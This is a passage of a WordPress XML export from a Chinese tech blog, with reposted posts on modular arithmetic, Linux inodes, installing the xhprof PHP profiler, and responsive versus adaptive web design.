		<wp:post_date><![CDATA[2014-10-23 14:30:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-10-23 14:30:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%8e%9f%e7%a0%81-%e5%8f%8d%e7%a0%81-%e8%a1%a5%e7%a0%81%e8%af%a6%e8%a7%a3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%8e%9f%e7%a0%81"><![CDATA[原码]]></category>
		<category domain="post_tag" nicename="%e5%8f%8d%e7%a0%81"><![CDATA[反码]]></category>
		<category domain="post_tag" nicename="%e8%a1%a5%e7%a0%81"><![CDATA[补码]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						</item>
					<item>
		<title>同余运算及其基本性质</title>
		<link>http://wp.veitor.net/2014/10/28/%e5%90%8c%e4%bd%99%e8%bf%90%e7%ae%97%e5%8f%8a%e5%85%b6%e5%9f%ba%e6%9c%ac%e6%80%a7%e8%b4%a8/</link>
		<pubDate>Tue, 28 Oct 2014 05:05:34 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=359</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: left;">     100除以7的余数是2，意思就是说把100个东西七个七个分成一组的话最后还剩2个。余数有一个严格的定义：假如被除数是a，除数是b（假设它们 均为正整数），那么我们总能够找到一个小于b的自然数r和一个整数m，使得a=bm+r。这个r就是a除以b的余数，m被称作商。我们经常用mod来表示 取余，a除以b余r就写成a mod b = r。</p>
<p style="text-align: left;">    如果两个数a和b之差能被m整除，那么我们就说a和b对模数m同余（关于m同余）。比 如，100-60除以8正好除尽，我们就说100和60对于模数8同余。它的另一层含义就是说，100和60除以8的余数相同。a和b对m同余，我们记作 a≡b(mod m)。比如，刚才的例子可以写成100≡60(mod 8)。你会发现这种记号到处都在用，比如和数论相关的书中就经常把a mod 3 = 1写作a≡1(mod 3)。</p>
<p style="text-align: left;">    之所以把同余当作一种运算，是因为同余满足运算的诸多性质。比如，同余满足等价关系。具体地说，它满足自反性（一个数永远和自己同余）、对称性（a和b同余，b和a也就同余）和传递性（a和b同余，b和c同余可以推出a和c同余）。这三个性质都是显然的。</p>
<p style="text-align: left;">     同余运算里还有稍微复杂一些的性质。比如，同余运算和整数加减法一样满足“等量加等量，其和不变”。小学我们就知道，等式两边可以同时加上一个相等的数。例 如，a=b可以推出a+100=b+100。这样的性质在同余运算中也有：对于同一个模数m，如果a和b同余，x和y同余，那么a+x和b+y也同余。在 我看来，这个结论几乎是显然的。当然，我们也可以严格证明这个定理。这个定理对减法同样有效。
<strong>性质：如果a≡b(mod m)，x≡y(mod m)，则a+x≡b+y(mod m)。</strong>
证 明：条件告诉我们，可以找到p和q使得a-mp = b-mq，也存在r和s使得x-mr = y-ms。于是a-mp + x-mr = b-mq + y-ms，即a+x-m(p+r) = b+y-m(q+s)，这就告诉我们a+x和b+y除以m的余数相同。
容易想到，两个同余式对应相乘，同余式两边仍然相等：
<strong>如果a≡b(mod m)，x≡y(mod m)，则ax≡by(mod m)。</strong>
证明：条件告诉我们，a-mp = b-mq，x-mr = y-ms。于是(a-mp)(x-mr) = (b-mq)(y-ms)，等式两边分别展开后必然是ax-m(…) = by-m(…)的形式，这就说明ax≡by(mod m)。
现在你知道为什么有的题要 叫你“输出答案mod xxxxx的结果”了吧，那是为了避免高精度运算，因为这里的结论告诉我们在运算过程中边算边mod和算完后再mod的结果一样。假如a是一个很大的数， 令b=a mod m，那么(a * 100) mod m和(b * 100) mod m的结果是完全一样的，这相当于是在a≡b (mod m)的两边同时乘以100。这些结论其实都很显然，因为同余运算只关心余数（不关心“整的部分”），完全可以每一次运算后都只保留余数。因此，整个运算过 程中参与运算的数都不超过m，避免了高精度的出现。
在证明<strong><em>Fermat小定理</em></strong>时，我们用到了这样一个定理：
<strong>如果ac≡bc(mod m)，且c和m互质，则a≡b(mod m)</strong> （就是说同余式两边可以同时除以一个和模数互质的数）。
证明：条件告诉我们，ac-mp = bc-mq，移项可得ac-bc = mp-mq，也就是说(a-b)c = m(p-q)。这表明，(a-b)c里需要含有因子m，但c和m互质，因此只有可能是a-b被m整除，也即a≡b(mod m)。</p>
&nbsp;
原文地址：http://www.matrix67.com/blog/archives/236]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>359</wp:post_id>
		<wp:post_date><![CDATA[2014-10-28 05:05:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-10-28 05:05:34]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%90%8c%e4%bd%99%e8%bf%90%e7%ae%97%e5%8f%8a%e5%85%b6%e5%9f%ba%e6%9c%ac%e6%80%a7%e8%b4%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e6%95%b0%e5%ad%a6"><![CDATA[数学]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						</item>
					<item>
		<title>Linux的inode的理解</title>
		<link>http://wp.veitor.net/2014/10/31/linux%e7%9a%84inode%e7%9a%84%e7%90%86%e8%a7%a3/</link>
		<pubDate>Fri, 31 Oct 2014 06:22:22 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=361</guid>
		<description></description>
		<content:encoded><![CDATA[一、inode是什么？
<div>理解inode，要从文件储存说起。</div>
<div>文件储存在硬盘上，硬盘的最小存储单位叫做"扇区"（Sector）。每个扇区储存512字节（相当于0.5KB）。</div>
&nbsp;
<div>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个"块"（block）。这种由多个扇区组成的"块"，是文件存取的最小单位。"块"的大小，最常见的是4KB，即连续八个 sector组成一个 block。</div>
&nbsp;
<div>文件数据都储存在"块"中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为"索引节点"。</div>
&nbsp;
<div>二、inode的内容</div>
<div>inode包含文件的元信息，具体来说有以下内容：</div>
<div>　　* 文件的字节数</div>
<div>　　* 文件拥有者的User ID</div>
<div>　　* 文件的Group ID</div>
<div>　　* 文件的读、写、执行权限</div>
<div>　　* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</div>
<div>　　* 链接数，即有多少文件名指向这个inode</div>
<div>　　* 文件数据block的位置</div>
&nbsp;
<div>可以用stat命令，查看某个文件的inode信息：</div>
<div>stat example.txt</div>
&nbsp;
<div>总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。</div>
&nbsp;
<div>三、inode的大小</div>
<div>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</div>
<div>每 个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定 在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。</div>
&nbsp;
<div>查看每个硬盘分区的inode总数和已经使用的数量，可以使用df命令。</div>
<div>df -i</div>
<div>查看每个inode节点的大小，可以用如下命令：</div>
<div>sudo dumpe2fs -h /dev/hda | grep "Inode size"</div>
<div>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</div>
&nbsp;
<div>四、inode号码</div>
<div>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</div>
&nbsp;
<div>这 里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或 者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号 码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</div>
<div></div>
使用ls -i命令，可以看到文件名对应的inode号码：
<div>ls -i example.txt</div>
&nbsp;
<div>五、目录文件</div>
<div>Unix/Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。</div>
&nbsp;
<div>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。</div>
&nbsp;
<div>ls命令只列出目录文件中的所有文件名：</div>
<div>ls /etc</div>
<div>ls -i命令列出整个目录文件，即文件名和inode号码：</div>
<div>ls -i /etc</div>
<div>如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。</div>
<div>ls -l /etc</div>
&nbsp;
<div>六、硬链接</div>
<div>一 般情况下，文件名和inode号码是"一一对应"关系，每个inode号码对应一个文件名。但是，Unix/Linux系统允许，多个文件名指向同一个 inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访 问。这种情况就被称为"硬链接"（hard link）。</div>
<div></div>
ln命令可以创建硬链接：
<div>ln 源文件 目标文件</div>
<div>运 行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做"链接数"，记录指向该inode的文 件名总数，这时就会增加1。反过来，删除一个文件名，就会使得inode节点中的"链接数"减1。当这个值减到0，表明没有文件名指向这个inode，系 统就会回收这个inode号码，以及其所对应block区域。</div>
&nbsp;
<div>这里顺便说一下目录文件的"链接数"。创建目录时， 默认会生成两个目录项："."和".."。前者的inode号码就是当前目录的inode号码，等同于当前目录的"硬链接"；后者的inode号码就是当 前目录的父目录的inode号码，等同于父目录的"硬链接"。所以，任何一个目录的"硬链接"总数，总是等于2加上它的子目录总数（含隐藏目录）,这里的 2是父目录对其的“硬链接”和当前目录下的".硬链接“。</div>
&nbsp;
<div>七、软链接</div>
<div>除了硬链接以外，还有 一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打 开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的"软链接"（soft link）或者"符号链接（symbolic link）。</div>
&nbsp;
<div>这 意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错："No such file or directory"。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode"链接数"不会因此 发生变化。</div>
&nbsp;
<div>ln -s命令可以创建软链接。</div>
<div>ln -s 源文文件或目录 目标文件或目录</div>
&nbsp;
<div>八、inode的特殊作用</div>
<div>由于inode号码与文件名分离，这种机制导致了一些Unix/Linux系统特有的现象。</div>
<div>　　1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。</div>
<div>　　2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。</div>
<div>　　3. 打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。</div>
<div>      第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时 候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的 inode则被回收。</div>
&nbsp;
九 实际问题
在一台配置较低的Linux服务器（内存、硬盘比较小）的/data分区内创建文件时，系统提示磁盘空间不足，用df -h命令查看了一下磁盘使用情况，发现/data分区只使用了66%，还有12G的剩余空间，按理说不会出现这种问题。 后来用df -i查看了一下/data分区的索引节点(inode)，发现已经用满(IUsed=100%)，导致系统无法创建新目录和文件。
&nbsp;
&nbsp;
查找原因：
/data/cache目录中存在数量非常多的小字节缓存文件，占用的Block不多，但是占用了大量的inode。
&nbsp;
解决方案：
1、删除/data/cache目录中的部分文件，释放出/data分区的一部分inode。
2、用软连接将空闲分区/opt中的newcache目录连接到/data/cache，使用/opt分区的inode来缓解/data分区inode不足的问题：
ln -s /opt/newcache /data/cache
&nbsp;
转自：
<a href="http://www.ruanyifeng.com/blog/2011/12/inode.html">http://www.ruanyifeng.com/blog/2011/12/inode.html</a>
<a href="http://blog.s135.com/post/295/">http://blog.s135.com/post/295/</a>
<a href="http://hi.baidu.com/leejun_2005/blog/item/d9aa13a53b3af6e99152ee7e.html">http://hi.baidu.com/leejun_2005/blog/item/d9aa13a53b3af6e99152ee7e.html</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>361</wp:post_id>
		<wp:post_date><![CDATA[2014-10-31 06:22:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-10-31 06:22:22]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[linux%e7%9a%84inode%e7%9a%84%e7%90%86%e8%a7%a3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
						</item>
					<item>
		<title>PHP性能调试工具xhprof的安装与使用</title>
		<link>http://wp.veitor.net/2014/11/03/php%e6%80%a7%e8%83%bd%e8%b0%83%e8%af%95%e5%b7%a5%e5%85%b7xhprof%e7%9a%84%e5%ae%89%e8%a3%85%e4%b8%8e%e4%bd%bf%e7%94%a8/</link>
		<pubDate>Mon, 03 Nov 2014 07:47:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=364</guid>
		<description></description>
		<content:encoded><![CDATA[今天试用了一下facebook的php性能调试工具xhprof，在安装的时候是一波三折，虽说从百度了安装方法，但也折腾了半天，不知是说明没写全还是我个人操作失误，那么我在这把我的安装方法讲述一下。环境是：Linux+Nginx+PHP
<pre class="lang:sh decode:true">#cd /tmp
#mkdir xhprof
#cd xhprof
#wget http://pecl.php.net/get/xhprof-0.9.4.tgz
//解压
#tar zxf xhprof-0.9.4.tgz
#cd xhprof-0.9.4/extension
//拷贝xhprof_html和xhprof_lib两个文件夹至可访问的web目录下，我的web根目录为/home/www
#cp -r xhprof_html xhprof_lib /home/www
//运行phpize
#/usr/local/webserver/php/bin/phpize
//运行configure为下一步编译做准备，详情了解Linux下的configure命令
#./configure --with-php-config=/usr/local/php/bin/php-config
#make
#make install</pre>
安装完后你会看到一个提示Installing shared extensions /usr/local/php/lib/php/extensions/no-debug-non-zts-20060626/xhprof.so，说明xhprof.so这个模块被生成了
接下来修改php.ini文件，添加：
<pre class="lang:sh decode:true">//添加xhprof.so这个扩展，位置就是刚才生成给你的
extension=/usr/local/php/lib/php/extensions/no-debug-non-zts-20060626/xhprof.so
//指定生成测试报告分析日志的目录，并保证可写权限
xhprof.output_dir=/home/www/tmp</pre>
重启php-fpm重新加载php配置文件
<span class="lang:sh decode:true crayon-inline">#/etc/init.d/php-fpm restart</span>
至此安装完毕，可以搞个phpinfo();页面看看，如果能看到下图则说明安装成功了<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141103143752.jpg"><img class="aligncenter size-full wp-image-365" alt="QQ截图20141103143752" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141103143752.jpg" width="628" height="141" /></a>
&nbsp;
<h2>xhprof的使用</h2>
写一个php脚本如
<pre class="lang:php decode:true">xhprof_enable();
function test()
{
 return 'this is a test demo';
}
test();
$xhprofData = xhprof_disable();
include_once '/home/www/houseinfo/xhprof_lib/utils/xhprof_lib.php';
include_once '/home/www/houseinfo/xhprof_lib/utils/xhprof_runs.php';
$xhprofRuns = new XHProfRuns_Default();
$xhprofRuns-&gt;save_run($xhprofData,'xhprof_foo');
?&gt;</pre>
通过URL访问该脚本后，会在之前设定的/home/www/tmp（php.ini中设定的）目录下生成分析日志，如“5457280fd8500.xhprof_foo.xhprof”
其中5457280fd8500为日志生成的id，通过地址http://YOUR_URL/xhprof_html/index.php?run=<strong>5457315580b0e</strong>&amp;source=xhprof_foo即可查看性能分析（如下图）
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141103154222.jpg"><img class="aligncenter size-full wp-image-366" alt="QQ截图20141103154222" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141103154222.jpg" width="1435" height="673" /></a>
你可以将上面php代码最后一行改为这样，以便直接点击链接到分析页查看，而无需自己再查看id并拼接成URL访问
<pre class="lang:php decode:true">&lt;?php
$run_id = $xhprofRuns-&gt;save_run($xhprofData,'xhprof_foo');
echo '&lt;a href="/xhprof_html/index.php?run='.$run_id.'&amp;source=xhprof_foo" target="_blank"&gt;查看分析报告&lt;/a&gt;';
?&gt;</pre>
xhprof提供3种报告：
一、单一运行报告：通过http://YOUR_URL/xhprof_html/index.php?run=<strong>5457315580b0e</strong>&amp;source=xhprof_foo地址查看的单一运行时的报告
二、diff报告：地址如http://YOUR_URL/xhprof_html/index.php?run1=<strong>xxxxxx</strong>&amp;run2=<strong>xxxxxxx</strong>&amp;source=xhprof_foo，提供两次对比id即可。
三、汇总报告，指定一组run id来汇总得到您想要的报告视图。如果你有三个XHProf运行，都在"xhprof_foo‘命名空间下,run id分别是1，2，3。要查看这些运行的汇总报告:http://YOUR_URL/xhprof_html/index.php?run<strong>=1，2，3</strong>&amp;source=xhprof_foo
XHProf输出说明
1. Inclusive Time ： 包括子函数所有执行时间。
2. Exclusive Time/Self Time ： 函数执行本身花费的时间，不包括子树执行时间。
3. Wall Time ： 花去了的时间或挂钟时间。
4. CPU Time ： 用户耗的时间+ 内核耗的时间
5. Inclusive CPU ： 包括子函数一起所占用的CPU
6. Exclusive CPU ： 函数自身所占用的CPU
可是这个界面看起来不是很直观也不爽，我们还可以装一个graphviz画图工具
<pre class="lang:sh decode:true">#wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.28.0.tar.gz
#tar -zxvf graphviz-2.28.0.tar.gz
#cd graphviz-2.28.0
#./configure
#make
#make install</pre>
安装完成后，会生成/usr/local/bin/dot文件，确保路径在PATH环境变量里，以便XHProf能找到它，graphviz处于<strong>/usr/local/lib/graphviz</strong>。
<span class="lang:sh decode:true crayon-inline">#vi ~/.bash_profile </span>
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141104133618.jpg"><img class="aligncenter size-full wp-image-372" alt="QQ截图20141104133618" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141104133618.jpg" width="391" height="187" /></a><span class="lang:sh decode:true  crayon-inline ">#echo $PATH  </span>输出一下看看应该有了这个路径
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141104135151.jpg"><img class="aligncenter size-full wp-image-373" alt="QQ截图20141104135151" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141104135151.jpg" width="735" height="33" /></a>
之后进入分析页面点击[View Full Callgraph]就能看到类似下图了
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2014/11/callgraph.png"><img class="aligncenter  wp-image-374" alt="callgraph" src="http://storage.veitor.net/uploads/2014/11/callgraph.png" width="673" height="464" /></a></p>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>364</wp:post_id>
		<wp:post_date><![CDATA[2014-11-03 07:47:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-03 07:47:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e6%80%a7%e8%83%bd%e8%b0%83%e8%af%95%e5%b7%a5%e5%85%b7xhprof%e7%9a%84%e5%ae%89%e8%a3%85%e4%b8%8e%e4%bd%bf%e7%94%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="xhprof"><![CDATA[xhprof]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
						</item>
					<item>
		<title>响应式与自适应的区别</title>
		<link>http://wp.veitor.net/2014/11/06/%e5%93%8d%e5%ba%94%e5%bc%8f%e4%b8%8e%e8%87%aa%e9%80%82%e5%ba%94%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Thu, 06 Nov 2014 08:14:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=377</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2014/11/6310d41cjw1em0lsear2xg20b408cn22.gif"><img class="aligncenter size-full wp-image-378" alt="6310d41cjw1em0lsear2xg20b408cn22" src="http://storage.veitor.net/uploads/2014/11/6310d41cjw1em0lsear2xg20b408cn22.gif" width="400" height="300" /></a></p>
起初，网页设计者都会设计固定宽度的页面，最开始的电脑显示器分辨率种类不多，因为当时电脑本来就少，即使有变化也是 800 850 870 880。
后来随着显示器越来越多，以及笔记本的普及，这种方式的页面出现了问题。于是出现了一种新的布局方式<strong>宽度自适应布局</strong>。我们平时谈论的自适应布局，大多指的就是宽度自适应布局。
在这种布局下，出现了两派：
<ul>
	<li>百分比宽度布局</li>
	<li>流式布局</li>
</ul>
题主说的是第一派，宽度使用百分比，文字使用em。第二派的布局以 iGoogle 为代表（已经停止）。
再后来，浏览器大战 时代，firefox、Oparo、Chrome …… 出现，结束了 IE 一统江湖的局面，N 年没有更新的 IE6 发布了新版本，以前已 IE 为标准的 CSS 向 W3C 标准趋近，随后各种针对浏览器的 <a href="http://baike.baidu.com/view/1119452.htm" target="_blank" rel="nofollow noopener noreferrer">css hack</a> 技术出现。
虽然浏览器这么多，但是<strong>响应式布局</strong>依然不是主流，人们还在使用 css hack 技术。注意我的用词——「不是主流」，虽然不是主流，不代表当时不被使用。
比如一向超前的伟大的 Google。当时没有响应式布局这个词语，但是慢慢出现了一个词——<strong>渐进增强</strong>，新词的出现总是伴随的旧词一起出现。就好比 3G 出现之前，没人管自己的手机叫 2G，所以，3G 和 2G 两个词是一起出现的（技术上当然2G技术先出现）。同理，渐进增强出现后，另一个词「优雅降级」也随之出现了。
词的意思可以自己看 wiki、Google，我只在这儿举一个例子，gmail 和 qqmail。
他俩的宽度都是 100%，都是自适应。但是：
qqmail 就是 css hack 的完美体现，你用任何一个浏览器，几乎可以看到同一个样子的邮箱，腾讯的前端工程师们用各种 css hack 技术来展示邮箱页面，为的是<strong>统一的用户体验</strong>。
而 gmail 使用了<strong>渐进增强</strong>，你的浏览器越强，你看到的效果就越好，用户体验就越好。
再后来，就是大家都熟知的 Google 发布了 android，于是互联网大战从 PC 打到了手机。还有 HTML5 标准的发布。
手机虽然屏幕变小了，但是却提供了更丰富的功能。还记得以前用诺基亚上 QQ 的事儿吗？我们访问的是 3g.qq.com，当时我使用的是中兴的手机，访问 wap.qq.com，在后来的职能手机都是访问 m.qq.com。
不禁有人问「真的需要为每个手机分别设计一个网页吗？」、「真的需要为手机和电脑设计不同的网页吗？」，解决方法当然有很多种，可以看看 <a href="http://www.csszengarden.com/" target="_blank" rel="nofollow noopener noreferrer">css zen garden</a> 相信做过前端的都看过这个网站，一个神奇的网站。
最终的解决方案胜出者是<strong>响应式布局</strong>。
响应式布局被大家熟知的一个重要原因就是 twitter 开源了 bootstrap。Google 第一次完成了<strong>从先驱到烈士</strong>。
好了，上面介绍的是从从“自适应”到“响应式”，以下 Responsive design ＝ RWD，Adaptive design ＝ AWD。
先说共同点，两者都是因为越来越多的 移动设备（ mobile, tablet device ）加入到互联网中来而出现的为移动设备提供更好的体验的技术。用技术来使网页适应从小到大（现在到超大）的不同分辨率的屏幕。有人说，RWD 是 AWD 包含的一个子集。
RWD：Ethan Marcote 的文章是大家认为 RWD 的起源。他提出的 RWD 是采用 CSS 的 media query 技术，配合流体布局（ fluid grids ）和同样可以自适应的图片/视频等资源素材。以上所说，都是通过 HTML 和 CSS 就能完成的。一般来说，RWD 倾向于只改变元素的外观布局，而不大幅度改变内容。Jeffrey Zeldman 总结说，我们就把 RWD 定义为一切能用来为各种分辨率和设备性能优化<b>视觉体验</b>的技术吧。
AWD：Adaptive Design 是 Aaron Gustafson 的书的标题。他认为 AWD 在包括 RWD 的 CSS media query 技术以外，也要用 Javascript 来操作 HTML 来更适应移动设备的能力。AWD 有可能会针对移动端用户减去内容，减去功能。AWD 可以在服务器端就进行优化，把优化过的内容送到终端上。AWD 通常会牵扯到另外一个词 “progressive enhancement” 。
progressive enhancement（渐进增强）：从针对最低端的，最低分辨率的设备的设计做起，逐步逐步为更高阶的设备增加功能和效果的做法。（换个角度说，也就是相当于为移动设备减去功能）
RWD 和 AWD 在断点（ break point ）的区别：
RWD 采用流体＋断点，在断点之间，页面依然会随窗口大小自动缩放（通过 fluid grid ），直到遇到断点改变界面样式。相对的，AWD 只在针对几种分辨率（如1280，800，640，320px）进行优化，在断点之间的自动过渡比较少。
还有一种说法：
RWD 一般来说需要在网页设计初期就开始（通常采用 mobile first 策略），所以旧的网站要做 RWD 很可能要完全重建。而 AWD 则采用保留现有桌面网站（ desktop version ）而对于更小的分辨率做针对性的优化（适应），这点对于很多老的网站来说很重要，因为重构成本太大。
另外，对于 mobile 用户的优化到底应该怎么做，有两方的说法各不相让。有人说，不应该因为用户使用的是 mobile device 就删去内容，限制他们的功能，应该平等对待。也有人说，正因为是移动设备，有其流量，性能，网速的局限性，用移动设备登录网站的目的也会更有针对性，要为 用户精简文字，精简最常用的功能放在首页，服务器端的优化才是真的针对 mobile 的优化。
最后：
在网上的各种说法里确实是有很多相互干扰相互矛盾的地方，但是其实技术都是摆在那里的。其实可以认为，AWD 在针对布局的优化中，可以采用 RWD 的策略，但是AWD 着力于更多其他的 JS 或者服务器上的优化，来强化移动端体验。
不用纠结于词汇，根据网站功能复杂度，预算和资源等，选择要使用的技术，从客户端的展现，到 JS，到服务器的优化等等。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>377</wp:post_id>
		<wp:post_date><![CDATA[2014-11-06 08:14:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-06 08:14:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%93%8d%e5%ba%94%e5%bc%8f%e4%b8%8e%e8%87%aa%e9%80%82%e5%ba%94%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%89%8d%e7%ab%af"><![CDATA[前端]]></category>
		<category domain="post_tag" nicename="%e5%93%8d%e5%ba%94%e5%bc%8f"><![CDATA[响应式]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
		<category domain="post_tag" nicename="%e8%87%aa%e9%80%82%e5%ba%94"><![CDATA[自适应]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						<wp:comment>
			<wp:comment_id>17</wp:comment_id>
			<wp:comment_author><![CDATA[Owen]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[pmowenxu@hotmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[180.150.141.243]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-06-17 02:11:49]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-06-17 02:11:49]]></wp:comment_date_gmt>
